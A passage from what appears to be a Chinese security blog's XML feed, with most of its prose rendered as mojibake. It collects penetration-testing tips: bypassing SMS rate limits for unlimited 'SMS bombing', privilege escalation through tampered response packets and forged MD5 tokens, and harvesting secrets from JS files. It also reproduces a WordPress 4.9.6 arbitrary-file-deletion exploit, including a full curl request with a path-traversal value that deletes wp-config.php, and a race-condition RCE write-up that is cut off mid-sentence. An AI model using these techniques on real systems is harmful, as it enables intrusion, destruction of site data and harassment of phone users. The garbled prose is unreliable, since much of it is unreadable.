rel="noopener">ä¸­å›½ç”µä¿¡æŸIDCæœºæˆ¿ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿè®¾è®¡ç¼ºé™·è‡´ä½¿ç³»ç»Ÿæ²¦é™·</a></p><p><strong>çŸ­ä¿¡è½°ç‚¸</strong></p><p>çŸ­ä¿¡è½°ç‚¸ï¼Œä¸€èˆ¬äººå¯èƒ½æŠ“åŒ…é‡æ”¾å¤±è´¥åå°±æ”¾å¼ƒäº†ã€‚è¿™é‡Œæœ‰ä¸ªæŠ€å·§ï¼Œ</p><p>æ˜¯ä»è¥¿é—¨å¹é›ªå¸ˆå‚…åšæ–‡é‡Œå­¦åˆ°çš„ç»•è¿‡çš„å§¿åŠ¿ï¼š</p><p>å‘é€çŸ­ä¿¡å¤„ä¸€èˆ¬æ¯éš”60ç§’æ‰èƒ½å‘é€ä¸€æ¬¡<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tidgpb01j30tt0czdip.jpg" alt></p><p>ä½†è‹¥æ˜¯å‘åŒ…æ—¶åœ¨æ‰‹æœºå·ååŠ ä¸Šä¸€ä¸ªç©ºæ ¼ã€åŠ å·æˆ–æ¢è¡Œç¬¦ç­‰ç‰¹æ®Šå­—ç¬¦ã€‚ç„¶åé‡æ–°å‘é€ï¼Œè¿™æ—¶è‹¥å‘é€æˆåŠŸï¼Œåˆ™è¯´æ˜å¯ç»•è¿‡é™åˆ¶ã€‚</p><p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tidx88r2j30uc0fo41a.jpg" alt></p><p>æ­¤æ—¶åœ¨intruderæ¨¡å—åªè¦æŒç»­é€’å¢ç©ºæ ¼å°±å¯é€ æˆæ— é™çŸ­ä¿¡è½°ç‚¸</p><p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiebp2jmj30sw0nyk2v.jpg" alt><br><a href="http://ximcx.cn/post-143.html" target="_blank" rel="noopener">åšæ–‡é“¾æ¥</a></p><h2 id="è¶Šæƒ"><a href="#è¶Šæƒ" class="headerlink" title="è¶Šæƒ"></a>è¶Šæƒ</h2><p><strong>è¶Šæƒè®¿é—®ç›®å½•</strong></p><p>å¯è¶Šæƒè®¿é—®åˆ°åå°è·¯å¾„ï¼Œç½‘ç«™ç»„ä»¶é…ç½®æ–‡ä»¶ï¼Œå¤‡ä»½æ–‡ä»¶ç­‰ï¼Œå½“ç„¶æ‰«ç›®å½•å­—å…¸ä¹Ÿè¦å¥½ã€‚</p><p><strong>ä¿®æ”¹èº«ä»½æ ‡è¯†</strong></p><p>æ›´æ”¹æˆåŠŸç™»é™†çš„ç”¨æˆ·çš„èº«ä»½æ ‡è¯†ï¼Œå¯èƒ½å°±èƒ½è¶Šæƒè®¿é—®åˆ°å…¶ä»–ç”¨æˆ·çš„é¡µé¢ã€‚</p><p>ä¾‹å¦‚ï¼š1ã€æœ¬äººä¹‹å‰æ›¾ç”¨testç”¨æˆ·å¼±å£ä»¤æ¼æ´ç™»é™†æˆåŠŸï¼Œç„¶åæ›´æ”¹å‚æ•°è¶Šæƒè®¿é—®åˆ°adminç”¨æˆ·ï¼›2ã€æ›¾çœ‹è¿‡ä¸€æ¼æ´ï¼šç”¨æˆ·è®¤è¯çš„tokenå€¼æ˜¯ç”¨æˆ·ååŠ æ—¶é—´æˆ³çš„md5å€¼ï¼Œè€Œæ°å¥½æ•°æ®åŒ…æŸå¤„å°±æœ‰è¿”å›ç”¨æˆ·ååŠ æ—¶é—´æˆ³ï¼Œç„¶åæ›´æ”¹æ—¶é—´æˆ³å‰çš„ç”¨æˆ·åï¼Œmd5ååŠ åœ¨tokenä¸ŠæˆåŠŸè¶Šæƒåˆ°å…¶ä»–ç”¨æˆ·ä¸Šï¼ˆè¿™ç§æ¼æ´ä¸€èˆ¬éœ€è¦ç»†å¿ƒæŸ¥æ‰¾ç™»é™†æ—¶èº«ä»½è®¤è¯å‚æ•°çš„è§„å¾‹ï¼‰</p><p>ä¹‹å‰çš„ä»»æ„å¯†ç é‡ç½®ç­‰æ¼æ´ï¼Œå…¶å®ä¹Ÿæ˜¯ä¿®æ”¹ç”¨æˆ·èº«ä»½æ ‡è¯†ï¼Œç³»ç»Ÿè®¤è¯æœºåˆ¶ä¸å®Œå–„å¯¼è‡´æ¼æ´å‡ºç°ã€‚</p><p><strong>æŠ“è¿”å›åŒ…</strong></p><p>åœ¨ç™»é™†æ—¶è¿”å›åŒ…å¯èƒ½è¿”å›ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ï¼Œæ­¤æ—¶æ”¹ä¸€æ”¹å‚æ•°è¯´ä¸å®šè¿˜èƒ½è¶ŠæƒæŸ¥åˆ°å…¶ä»–ç”¨æˆ·ä¿¡æ¯ã€‚</p><p>æˆ–æ³¨å†Œã€æ‰¾å›å¯†ç å‘é€çŸ­ä¿¡é‚®ç®±æ—¶ï¼Œå¯èƒ½ç›´æ¥è¿”å›éªŒè¯ç ç­‰</p><p>åœ¨è¿”å›åŒ…é‡Œï¼Œæ›´æ”¹ä¸‹å‚æ•°ä¸ºtrueã€successã€1ï¼Œå¯èƒ½å°±èƒ½æœªæˆæƒè¿›å…¥åå°</p><p>1ç™»é™†æŠ“åŒ…ï¼Œç‚¹å‡»å³é”®ï¼ŒæŠ“å–è¿”å›åŒ…<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiepy71tj30th0b70u7.jpg" alt><br>2è§‚å¯Ÿè¿”å›çš„å‚æ•°<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tif4gp1bj30kl08e3z8.jpg" alt><br>3æ›´æ”¹å‚æ•°<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6tiffyxc3j30gi07o750.jpg" alt><br>4æˆåŠŸè¿›å…¥åå°</p><p><strong>ç¦ç”¨js</strong></p><p>æ›¾ç»ç¢°åˆ°è¿‡ä¸€ä¸ªç«™ç‚¹ï¼Œèƒ½æœªç™»é™†è®¿é—®åå°é¦–é¡µï¼Œä½†å†æ¬¡ç‚¹å‡»å°±ä¼šé€€å‡ºåˆ°ç™»é™†é¡µé¢ã€‚æ­¤æ—¶ç¦ç”¨jsï¼Œç„¶åæˆåŠŸè®¿é—®éƒ¨åˆ†åŠŸèƒ½æ¨¡å—ï¼ŒæˆåŠŸåˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ‹¿åˆ°webshellã€‚</p><p>å› ä¸ºæœ‰äº›ç½‘ç«™çš„Urlè·³è½¬æ˜¯ç”±å‰ç«¯jsæ§åˆ¶ï¼Œè¿™æ—¶ç¦ç”¨jsåè¯´ä¸å®šå°±èƒ½æˆåŠŸè®¿é—®ã€‚</p><p>ä¸‹é¢æ˜¯ç«ç‹çš„ä¸€ä¸ªç¦ç”¨jsçš„æ’ä»¶<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tifsq9hbj30tq05vt92.jpg" alt></p><h2 id="0x08-çœ‹ç½‘ç«™æºç ä¿¡æ¯"><a href="#0x08-çœ‹ç½‘ç«™æºç ä¿¡æ¯" class="headerlink" title="0x08 çœ‹ç½‘ç«™æºç ä¿¡æ¯"></a>0x08 çœ‹ç½‘ç«™æºç ä¿¡æ¯</h2><p>å½“ä½ æ€è·¯æ¯ç«­çš„æ—¶å€™ä¸å¦¨çœ‹çœ‹æºç ï¼Œå®ƒæ˜¯ä¸€å—å®è—ï¼Œè¯´ä¸å®šå°±èƒ½åœ¨é‡Œé¢å‘ç°æƒŠå–œã€‚æœ‰äº›ç¨‹åºå‘˜ä¼šæŠŠåå°çš„åŠŸèƒ½é“¾æ¥æ”¾åœ¨å‰ç«¯æºç ä¸­,è¯´ä¸å®šå°±å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œç”šè‡³æœ‰äº›å¥‡è‘©ç¨‹åºå‘˜åœ¨å‰ç«¯ä»£ç å­˜æ”¾æµ‹è¯•çš„è´¦å·å¯†ç ã€‚</p><p>é¦–å…ˆç»™å¤§å®¶æ¨èä¸€æ¬¾å·¥å…·ï¼Œå¾ˆå¼ºå¤§ï¼šJSFinder</p><p>é“¾æ¥ï¼š<a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a></p><p>è¿™æ˜¯ä¸€æ¬¾åœ¨ç½‘ç«™çš„jsæ–‡ä»¶ä¸­æå–URLï¼Œå­åŸŸåçš„å·¥å…·ï¼Œç”¨åœ¨åå°ç™»é™†ç•Œé¢æŠ“å–ä¸€äº›æ•æ„Ÿçš„jsæ–‡ä»¶æ•ˆæœä¹Ÿå¾ˆä¸é”™ï¼Œæˆ‘æ›¾ç”¨å®ƒæŠ“å–è¿‡ç½‘ç«™åå°çš„ä¸€ä¸ªæ’ä»¶æºç ï¼Œåå°çš„åŠŸèƒ½é“¾æ¥ï¼Œæ•æ„Ÿä¿¡æ¯ï¼Œæ¥å£é“¾æ¥ï¼ˆå­˜åœ¨xssï¼Œæ³¨å…¥ï¼‰ç­‰ç­‰ã€‚æˆ‘åŒå­¦è¿˜è¯´è¿‡burpä¹Ÿæœ‰æŠ“jsçš„æ’ä»¶ï¼Œä½†å¯æƒœæˆ‘æ²¡æ‰¾åˆ°ï¼Œç”¨è¿™æ¬¾ä¹Ÿå·®ä¸å¤šå¤Ÿç”¨äº†ã€‚</p><p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tig6pniuj30tw0irte6.jpg" alt></p><p>è¿™é‡Œè®²ä¸€ä¸‹ä¹Œäº‘çš„ä¸€ä¸ªæ¡ˆä¾‹ï¼Œå…·ä½“é“¾æ¥å¿˜è®°äº†ï¼Œå°±è®²ä¸€ä¸‹æ€è·¯ï¼š</p><p>æ´ä¸»ä¹‹å‰å‘ç°äº†ä¸€ä¸ªæ¼æ´ï¼Œæäº¤åï¼Œç­‰è¿‡ä¸€æ®µæ—¶é—´å†å»ç§ä¸‹é‚£ä¸ªç«™ï¼Œå‘ç°ç³»ç»Ÿå¤§å˜æ ·ï¼Œè¿urlçš„è·¯å¾„éƒ½æ”¹äº†ï¼Œå·²ç»ä¿®å¤äº†å—ï¼Ÿ</p><p>ä½†æ˜¯å½“æ´ä¸»å³é”®æŸ¥çœ‹æºä»£ç æ—¶ï¼Œå‘ç°è¿˜ä¿ç•™ç€ä¹‹å‰æ—§ç³»ç»Ÿçš„é“¾æ¥å’Œä»£ç ï¼Œæœ‰çš„åªæ˜¯æ³¨é‡Šäº†è€Œå·²ï¼Œå…³é”®æ˜¯æ¼æ´ç«Ÿç„¶è¿˜æ²¡ä¿®ï¼Ÿï¼tqlï¼Œè¿™ç§å¼€å‘å»ºè®®ç›´æ¥ç¥­å¤©ã€‚</p><p>çœ‹jsä»£ç ï¼Œç”šè‡³ä¸€äº›å›¾ç‰‡çš„é“¾æ¥ï¼Œè¯´ä¸å®šå°±æœ‰ä¸€ç•ªæ„å¤–çš„æ”¶è·ã€‚æ¯”å¦‚R3startå¤§ä½¬çš„ä¸€ç¯‡åšæ–‡ä¸­è®²çš„å°±å¾ˆç²¾å½©ä»JSä¿¡æ¯æ³„éœ²åˆ°Webshell</p><p>æ–‡ç« çš„æ€è·¯æ˜¯ï¼š</p><p>ä½œè€…è¿›è¡Œæ¸—é€æ—¶ï¼Œåœ¨ä¸€ä¸ªå›¾ç‰‡é“¾æ¥ä¸­å‘ç°äº†ä¸€ä¸ªä¸‰çº§å­åŸŸåï¼Œåˆ æ‰URlã€ç›´æ¥è®¿é—®æ ¹è·¯å¾„å‘ç°äº†ä¸€ä¸ªtitleæ˜¯æŸç®¡ç†å¹³å°çš„é¡µé¢ã€‚</p><p>ä½†é¡µé¢æ— æ³•æ­£å¸¸åŠ è½½ï¼Œæ•…è¿›è¡Œç›®å½•æ‰«æå¾—åˆ°åå°åœ°å€å’Œåå°jså‹ç¼©åŒ…ï¼Œç„¶ååœ¨æºç çš„æŸå¤„JSä»£ç ä¸­å‘ç°äº†å¤šä¸ªå¯ç™»å½•çš„è´¦å·ã€‚</p><p>å°è¯•å¼±å£ä»¤æ— æœåï¼Œä»jså‹ç¼©åŒ…æŸ¥åˆ°äº†é»˜è®¤å¯†ç è§„åˆ™ã€‚æˆåŠŸç™»é™†ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œä½†å‘ç°æƒé™å¹¶ä¸å¤§ã€‚</p><p>ç„¶åé€šè¿‡jsä»£ç å¯»æ‰¾è·å–åˆ°äº†åˆ«çš„æ¥å£åœ°å€ï¼Œå‘ç°å­˜åœ¨è¶Šæƒæ¼æ´ï¼Œé€šè¿‡JSæ¥å£è¶Šæƒè®¿é—®åˆ°æ´»åŠ¨ç®¡ç†é¡µé¢è·å–åˆ°ç®¡ç†å‘˜çš„ç™»é™†è´¦å·ã€‚</p><p>æœ€åæ‰¾ä¸Šä¼ ç‚¹ï¼ŒæŠ“åŒ…æ”¹åç¼€æ‹¿shellä¸€æ°”å‘µæˆã€‚</p><p>å¼•ç”¨R3startå¸ˆå‚…çš„ä¸€å¥è¯ï¼š</p><p>å³é”®æŸ¥çœ‹JSæºç ï¼Œä½ å¯èƒ½ä¼šå‘ç°â€¦ è¢«æ³¨é‡Šçš„è´¦å·å¯†ç ã€æ¥å£ã€tokenã€çœŸå®IPã€å¼€å‘ç¯å¢ƒâ€¦. æ°¸è¿œä¸çŸ¥é“ç¨‹åºå‘˜åœ¨JSä¸­ç»™ä½ ç•™ä¸‹äº†ä»€ä¹ˆæ ·çš„æƒŠå–œã€‚</p><h2 id="0x09-æ€»ç»“"><a href="#0x09-æ€»ç»“" class="headerlink" title="0x09 æ€»ç»“"></a>0x09 æ€»ç»“</h2><p>ä¸Šé¢çš„å†…å®¹æ¯”è¾ƒæ‚ï¼Œç¯‡å¹…ä¹Ÿæ¯”è¾ƒé•¿ï¼Œæ‰€ä»¥æœ‰äº›åœ°æ–¹å°±æ²¡æœ‰å±•å¼€æ¥è®²ã€‚æœ‰äº›åœ°æ–¹å¯èƒ½è®²å¾—æ¯”è¾ƒç®€ç•¥æ¨¡ç³Šï¼Œè¯·å¤§å®¶è§è°…ï¼Œå¦‚æœæœ‰ç–‘æƒ‘å¯ä»¥è”ç³»æˆ‘ã€‚</p><p>é¡ºä¾¿è¯´ä¸‹æ„Ÿæƒ³ï¼š</p><p>è¿™æ®µæ—¶é—´çš„å®‰æœå®ä¹ å¯¹æˆ‘å¸¦æ¥å¾ˆå¤§çš„å¸®åŠ©ï¼Œé¢å¯¹ä¸€äº›ç³»ç»Ÿç›®æ ‡å›ºå®šï¼Œä¸èƒ½æ¨ªå‘æ¸—é€ã€‚Cæ®µã€ç«¯å£æ‰«æã€å­åŸŸåæŒ–æ˜ç­‰ä¿¡æ¯æ”¶é›†éƒ½åšä¸äº†ï¼Œåªèƒ½ç¡¬ç€å¤´çš®æ€¼ç›®æ ‡ã€‚è€Œåšå®‰å…¨æœåŠ¡ç»å¸¸ç¢°åˆ°çš„å°±æ˜¯åå°ç™»é™†ç•Œé¢ï¼Œæ€¼ç€æ€¼ç€å°±æˆé•¿äº†ï¼Œæ¯•ç«Ÿå­°èƒ½ç”Ÿå·§ã€‚</p><p>è™½ç„¶æ¸—é€æ¯”è¾ƒè‰°éš¾ï¼Œä½†ä¹ŸåŸ¹å…»äº†æˆ‘çš„æ¼æ´æŒ–æ˜èƒ½åŠ›ã€‚åæ€ä¸‹è‡ªå·±ä»¥å‰æŒ–æ¼æ´ï¼Œéƒ½æ˜¯èµ°é©¬è§‚èŠ±ï¼Œé¢å¯¹ä¿¡æ¯æ”¶é›†æ¥çš„ä¸€å¤§å †èµ„äº§ï¼Œéƒ½æ˜¯éšä¾¿æµ‹ä¸‹å°±ç»“æŸï¼Œå¹¶æ²¡æœ‰æ·±å…¥ä¸”ç»†å¿ƒåœ°å»å¯»æ‰¾æ¼æ´ï¼Œå¯¼è‡´ä¹‹å‰çš„SRCæŒ–æ˜ä¹‹æ—…ååˆ†å›°éš¾ã€‚å› æ­¤å¸Œæœ›æ–°æ‰‹åœ¨æŒ–æ´æ—¶èƒ½å¤Ÿæ›´åŠ ç»†å¿ƒï¼Œç‰¹åˆ«æ˜¯æŒ–æ˜SRCæ—¶ï¼Œæœ‰æ—¶å°±å¾—èŠ±æ—¶é—´ä¸€ä¸ªå‚æ•°ä¸€ä¸ªå‚æ•°å»â€æ€¼â€ï¼Œæ‰èƒ½æœ‰æ‰€æ”¶è·ã€‚è¦ç›¸ä¿¡ï¼Œå¤§åŠ›å‡ºå¥‡è¿¹ï¼</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æœ€æ–°ç‰ˆwordpressä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´å¤ç°</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E6%9C%80%E6%96%B0%E7%89%88wordpress%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E6%9C%80%E6%96%B0%E7%89%88wordpress%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨æ¨ç‰¹ä¸Šçœ‹åˆ°äº†ä¸€ç¯‡paperï¼Œ<a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="noopener">ç‚¹æˆ‘å•Š</a></p><p>wpå¾ˆä¹…æ²¡çœ‹åˆ°æ´äº†ï¼Œè¿™ä¸ªæ¼æ´ä¸ƒä¸ªæœˆä¹‹å‰å°±ä¸ŠæŠ¥äº†</p><p><img src="https://www.t00ls.net/attachments/month_1806/1806271941e0c68c6590fb61ce.jpg" alt></p><p>å¯ä»¥ç›´æ¥åˆ©ç”¨åˆ é™¤å›¾ç‰‡é‚£ä¸ªåŠŸèƒ½åˆ é™¤ç½‘ç«™é…ç½®æ–‡ä»¶ï¼Œå¯¼è‡´ç½‘ç«™åªèƒ½é‡è£…ã€‚</p><h2 id="å¤ç°è¿‡ç¨‹"><a href="#å¤ç°è¿‡ç¨‹" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h2><p>è¿™æ˜¯æˆ‘ä¸‹è½½çš„æœ€æ–°ç‰ˆwordpress(4.9.6)</p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719418e1d18c525441003.jpg" alt></p><p>ç™»é™†åå°ï¼š</p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719417422f20751eeb517.jpg" alt></p><p>ä¸Šä¼ å¼ å›¾ç‰‡ï¼š</p><p><img src="https://www.t00ls.net/attachments/month_1806/1806271941c262f1600ee929f9.jpg" alt><br><img src="https://www.t00ls.net/attachments/month_1806/18062719417ba7d799ffd03dac.jpg" alt></p><p>ç„¶åedit</p><p>å‘æŒ¥ä¸€ä¸‹Curlçš„ä½œç”¨ã€‚<br>æ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://192.168.19.129/wordpress/wp-admin/post.php?post=7&apos; -H &apos;Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=wing%7C1531306971%7CZycd9e4B1COvm6oKBWF2SlMfqWu2u0xTG85eAD4giBx%7C099559ea1580b258b82765641ac85a51576507c8c3ebb8e131b20c9eec8f65bc; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=wing%7C1531306971%7CZycd9e4B1COvm6oKBWF2SlMfqWu2u0xTG85eAD4giBx%7Cba9defabde03b6acdb4a5c43fc39244efbec15913483ae43ff0b624be552f5a4; wp-settings-time-1=1530097413&apos; -d &apos;action=editattachment&amp;_wpnonce=28380b3d4a&amp;thumb=../../../../wp-config.php&apos;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠé‡Œé¢çš„cookieå’Œ_wpnonceè¿˜æœ‰postçš„å€¼æ¢æˆä½ çš„ã€‚</p><p>_wpnonceåœ¨é¡µé¢ä¸­ï¼š</p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719416e3066a6bbbff35a.jpg" alt></p><p><img src="https://www.t00ls.net/attachments/month_1806/180627194156de439440ffd6f8.jpg" alt></p><p>302è·³è½¬è¯´æ˜ç¼–è¾‘æˆåŠŸã€‚<br><img src="https://www.t00ls.net/attachments/month_1806/1806271941fac9a1bd5595aff2.jpg" alt></p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719414486ac7e14bbfe0e.jpg" alt></p><p>ç°åœ¨ç‚¹å‡»Delete Permanentlyå³å¯ã€‚<br><img src="https://www.t00ls.net/attachments/month_1806/18062719410de6e321efa45d83.jpg" alt></p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719417bd0b5cc4ef818d3.jpg" alt></p><p>é…ç½®æ–‡ä»¶æˆåŠŸåˆ é™¤ã€‚</p><p>æ¼æ´åŸç†ä½œè€…åšå®¢ä¸Šæœ‰ç»†èŠ‚ï¼Œæœ¬æ„æ˜¯åˆ é™¤ç¼©ç•¥å›¾ã€‚ä½†æ˜¯æ²¡æœ‰å¯¹è·¯å¾„åšé™åˆ¶ï¼Œå¯¼è‡´å¯ä»¥ä»»æ„æ–‡ä»¶åˆ é™¤ã€‚</p><p>ä½œè€…ç»™çš„ä¿®å¤ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add_filter( &apos;wp_update_attachment_metadata&apos;, &apos;rips_unlink_tempfix&apos; );</span><br><span class="line"></span><br><span class="line">function rips_unlink_tempfix( $data ) &#123;</span><br><span class="line">    if( isset($data[&apos;thumb&apos;]) ) &#123;</span><br><span class="line">        $data[&apos;thumb&apos;] = basename($data[&apos;thumb&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Sakura"><a href="#Sakura" class="headerlink" title="Sakura"></a>Sakura</h2><p>é¸¡è‚‹ä¹‹å¤„åœ¨äºéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œä½†æ˜¯å±å®³è›®å¤§çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨ç«äº‰æ¡ä»¶ï¼ˆRace Conditionï¼‰å¯¹ç›®æ ‡Webåº”ç”¨å®ç°RCE</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E5%88%A9%E7%94%A8%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%EF%BC%88Race%20Condition%EF%BC%89%E5%AF%B9%E7%9B%AE%E6%A0%87Web%E5%BA%94%E7%94%A8%E5%AE%9E%E7%8E%B0RCE/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E5%88%A9%E7%94%A8%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%EF%BC%88Race%20Condition%EF%BC%89%E5%AF%B9%E7%9B%AE%E6%A0%87Web%E5%BA%94%E7%94%A8%E5%AE%9E%E7%8E%B0RCE/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.3001.net/images/20190927/1569574102_5d8dccd6280d4.jpeg" alt><br><strong>æœ¬æ–‡è®²è¿°äº†ä½œè€…åœ¨æŸé‚€è¯·æµ‹è¯•é¡¹ç›®ä¸­ï¼Œé€šè¿‡å¯¹SQLæ³¨å…¥å’Œç«äº‰æ¡ä»¶ï¼ˆRace Conditionï¼‰çš„ç»„åˆåˆ©ç”¨ï¼Œåˆ©ç”¨ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨å’ŒæœåŠ¡å™¨è½¬ç§»ä¸Šä¼ æ–‡ä»¶åˆ°Amazon S3çš„æ—¶é—´å·®ï¼Œæœ€ç»ˆå®ç°äº†å¯¹ç›®æ ‡åº”ç”¨çš„RCEæ¼æ´ã€‚ç”±äºè¯¥RCEæ¼æ´çš„å‘ç°ç›¸å¯¹ç‹¬ç‰¹ï¼Œæ‰€ä»¥ä½œè€…åœ¨æœ¬æ–‡ä¸­ç€é‡ä»ç«äº‰æ¡ä»¶ï¼ˆRace Conditionï¼‰çš„è§¦å‘æœºåˆ¶è¯´èµ·ï¼Œå’Œå¤§å®¶åˆ†äº«ã€‚</strong></p><p>ç«äº‰æ¡ä»¶ï¼ˆRace Conditionï¼‰ï¼šè®¡ç®—æœºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¹¶å‘ã€æ— åºã€å¤§é‡çš„è¿›ç¨‹åœ¨ä½¿ç”¨æœ‰é™ã€ç‹¬å ã€ä¸å¯æŠ¢å çš„èµ„æºï¼Œç”±äºè¿›ç¨‹æ— é™ï¼Œèµ„æºæœ‰é™ï¼Œäº§ç”ŸçŸ›ç›¾ï¼Œè¿™ç§çŸ›ç›¾ç§°ä¸ºç«äº‰ï¼ˆRaceï¼‰ã€‚ç«äº‰æ¡ä»¶ï¼ˆRace Conditionï¼‰æ—¨åœ¨æè¿°ä¸€ä¸ªç³»ç»Ÿæˆ–è€…è¿›ç¨‹çš„è¾“å‡ºä¾èµ–äºä¸å—æ§åˆ¶çš„äº‹ä»¶å‡ºç°é¡ºåºæˆ–è€…å‡ºç°æ—¶æœºã€‚ç”±äºä¸¤ä¸ªæˆ–è€…å¤šä¸ªè¿›ç¨‹ç«äº‰ä½¿ç”¨ä¸èƒ½è¢«åŒæ—¶è®¿é—®çš„èµ„æºï¼Œä½¿å¾—è¿™äº›è¿›ç¨‹æœ‰å¯èƒ½å› ä¸ºæ—¶é—´ä¸Šæ¨è¿›çš„å…ˆååŸå› è€Œå‡ºç°é—®é¢˜ã€‚</p><h2 id="æ¼æ´è¯¦æƒ…"><a href="#æ¼æ´è¯¦æƒ…" class="headerlink" title="æ¼æ´è¯¦æƒ…"></a>æ¼æ´è¯¦æƒ…</h2><p><strong>ç¬¬ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½ç‚¹upload.php</strong><br>è¿™é‡Œçš„å‰ææ˜¯ï¼Œæˆ‘å·²ç»é€šè¿‡SQLæ³¨å…¥è·å–åˆ°äº†ç›®æ ‡Webåº”ç”¨çš„ç®¡ç†å‘˜è´¦æˆ·å‡­æ®ï¼Œç„¶åç™»å½•åˆ°å…¶å†…éƒ¨ç®¡ç†ç•Œé¢åï¼Œæˆ‘å‘ç°å¯é€šè¿‡è¯¥ç®¡ç†é¢æ¿ä¸­çš„upload.phpåŠŸèƒ½å‘å¸ƒæ–°é—»æˆ–æ–‡ç« ï¼š<br><img src="https://image.3001.net/images/20190927/1569573792_5d8dcba09f119.png" alt></p><p>æ²¡åšå¤ªå¤šè€ƒè™‘ï¼Œæˆ‘å°±ç›´æ¥é€šè¿‡upload.phpå°è¯•ä¸Šä¼ äº†ä¸€ä¸ª.phpæ–‡ä»¶shellï¼Œä½†é—®é¢˜æ˜¯è¯¥ä¸Šä¼ åŠŸèƒ½é™åˆ¶äº†å¯¹.phpæ ¼å¼æ–‡ä»¶çš„ä¸Šä¼ ï¼Œåœ¨å˜åŒ–.PhPã€.php3ã€phpphpã€ç©ºå­—ç¬¦ç­‰å½¢å¼çš„ç»•è¿‡æ–¹æ³•åï¼Œè¿˜æ˜¯ä¸è¡Œï¼š</p><p><img src="https://image.3001.net/images/20190927/1569573819_5d8dcbbb2d374.png" alt></p><p>ç„¶åï¼Œæˆ‘æƒ³åˆ°äº†å­˜å‚¨å‹XSSï¼Œèƒ½ä¸èƒ½é€šè¿‡ä¸Šä¼  .htmlã€.xmlæˆ–.svgæ ¼å¼æ–‡ä»¶å‘¢ï¼Ÿè¿™ä¸€ä¸‹ä¸Šä¼ æ€»ç®—æˆåŠŸäº†ï¼Œä½†æ˜¯ï¼Œç”±äºç›®æ ‡Webåº”ç”¨åˆä¼šæŠŠç”¨æˆ·ä¸Šä¼ æ–‡ä»¶è½¬å‚¨åˆ°äº‘ç«¯çš„S3å­˜å‚¨æ¡¶ä¸­å»ï¼Œé‚£åœ¨S3å­˜å‚¨æ¡¶è§¦å‘XSSä¹Ÿæ²¡æ„ä¹‰äº†ã€‚å¥½å§ï¼Œé‚£æš‚æ—¶æŠŠè¿™ä¸ªé—®é¢˜æ”¾ä¸€è¾¹ï¼Œæ¥çœ‹å…¶å®ƒçš„ã€‚</p><p><strong>ç¬¬äºŒä¸ªä¸Šä¼ åŠŸèƒ½ç‚¹modify.php</strong><br>åœ¨æ²¡æœ‰å¤´ç»ªä¹‹æ—¶ï¼Œæˆ‘åˆè¿”å›ç®¡ç†é¢æ¿ä¸­â€œnewsâ€æ ç›®ï¼Œæƒ³çœ‹çœ‹èƒ½ä¸èƒ½åœ¨æ·»åŠ 